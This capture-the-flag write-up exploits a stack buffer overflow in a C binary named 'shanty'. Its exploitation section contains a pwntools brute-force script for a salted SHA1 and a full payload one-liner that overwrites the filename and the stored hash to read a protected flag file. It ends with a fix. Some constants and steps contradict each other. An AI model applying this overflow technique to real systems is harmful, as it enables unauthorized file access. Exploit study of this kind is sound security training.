Overview

The executable shanty in the /challenges/shanty directory asks for a router password and if given the correct one, returns secret information from the info file, located in the same directory.

We have access to the source code and the binary.

We want the flag file located in that directory but only the shanty executable has reading premission for that file.

Vulnerability

After inspecting the source code (written in C) we see that although there is a boundary for the user input string length at scanf("%69s", password); (69 byte = 69 chars), there are only 20 allocated bytes for the password in the stack. 

FILE *file;                                             //4 bytes
unsigned char content[128];                           //128 bytes
unsigned char correct_hash[20] = {...};                //20 bytes
char filename[] = "/challenges/shanty/info";           //23 bytes + 1 for "\n"
unsigned char salt[8] = {...};                          //8 bytes
-> unsigned char password[20];                         //20 bytes
unsigned char salted_password[28];                     //28 bytes
																														
-> scanf("%69s", password);  //limit: 69 bytes

This makes this program vulnerable to stack buffer overflow attacks.

Exploitation

The first thing we did was open up the source code and try to understand the funcionality of the code. Then we immediately saw a vulnerability and possibility to smash the stack and started calculating whether we could fully change the variable correct_hash to our advantage.

We made a rough sketch of the content in the stack and did some math:

Stack memory allocation:

> 0x00000000000....

     [BUFFER ....
ESP =>	salted password
				password (20 bytes)
				salt (8 bytes)
				filename (23 + 1 bytes)
				correct_hash (20 bytes) (we can not reach 0x4b, 0xc1, 0x03)
				content
				file
		  ............]
EBS =>
-------------------
  <return address>

> 0xFFFFFFFFFFFF....

Overwritable bytes from password: 69 (limit of scanf) - 20 (length of password) = 49 bytes

Bytes needed to fully overwrite correct_hash from password (8+ 23 + 1 + 20) = 52 bytes

Difference / unreachable bytes in correct_hash: 52 - 49 = 3 byte

At this point it was clear that:

  1. Bruteforcing a password with (20-1=)19 characters would take too long → 19 lowercase letters alone would have 766,467,265,200,361,989,012,979,712 combinations.
  1. We could not fully overwrite the correct_hash variable
  1. We could change the file path from info to flag

To get the flag we would need to bruteforce an input for the SHA1 function used in the source code that ends with the 3 bytes we can not reach.

Our payload would consist of:

PAYLOAD:
	[password: should end with the 3 given bytes after hashing, 20 bytes] + 
	[salt: unchanged, 8 bytes] +
	[filename: changed to /challenges/shanty/info, 24 bytes] +
	[correct_hash: overwritten part with 3 unreachable bytes, 20 bytes]

Therefore we started using the gdb-debugger to disassemble the binary and to figure out the memory spaces of each relevant memory space:

Memory space of salt: [ebp-0xc0],0x5a - [ebp-0xb9],0x54

Memory space of filename: [ebp-0xb8],0x6168632f - [ebp-0xa4],0x6f666e

Memory space of correct_hash: [ebp-0xa0],0xffffd52c - [ebp-0xb9],0xffffd518

And we wrote down the content of these memory spaces (little endian):

salt = 5A C8 85 87 9E 33 DF 54

filename = 2f 63 68 61 6c 6c 65 6e 67 65 73 2f 73 68 61 6e 74 79 2f 69 6e 66 6f 00

correct_hash = 32aab73ac651c039e8908865044f0314cc00c103

Then we figured out what the 3 bytes unreachable to us were: 0x4b, 0xc1, 0x03

So we used a python script to find the input (19 bytes) we should hash that ends with 0x4b, 0xc1, 0x03. That would give us the hashed and pre-hashed version of our password and would give us access to the flag after using it into our payload. 

#!/usr/bin/env python3
import re
import hashlib
from pwn import *

CORRECT_HASH = "1dbb7e1f7283190b1d17658cc73d75dea54bc103"
END = "00c103"
SALT = b"\x5a\xc8\x85\x87\x9e\x33\xdf\x54"

def hash_match(s):
    h = hashlib.sha1()
    h.update(SALT)
    h.update(s.encode())
    return h.hexdigest().endswith(END)

def main():
    solve()
    answer = iters.mbruteforce(
            lambda x: hash_match(x), string.ascii_letters + string.digits, 19, threads=4)
    print(answer)
 
if __name__ == '__main__':
    main()

So we constructed our payload string based on our model and started the attack:

./shanty < <(python3 -c 'import sys; sys.stdout.buffer.write(b"mWmN" + b"\x00\x00\x00\x01" + b"A"*12 + b"\x5A\xC8\x85\x87\x9E\x33\xDF\x54" + b"\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x73\x2f\x73\x68\x61\x6e\x74\x79\x2f\x66\x6c\x61\x67\x00"+ b"\x32\xaa\xb7\x3a\xc6\x51\xc0\x39\xe8\x90\x88\x65\x04\x4f\x03\x14\xcc\x00\xc1\x03")')

and immediately got the flag.

Solution

We could not have successfully executed the exploit, if the sourcecode had the right limit for scanf. The solution would be to match the max input size to the allocated memory size: scanf("%20s", password);
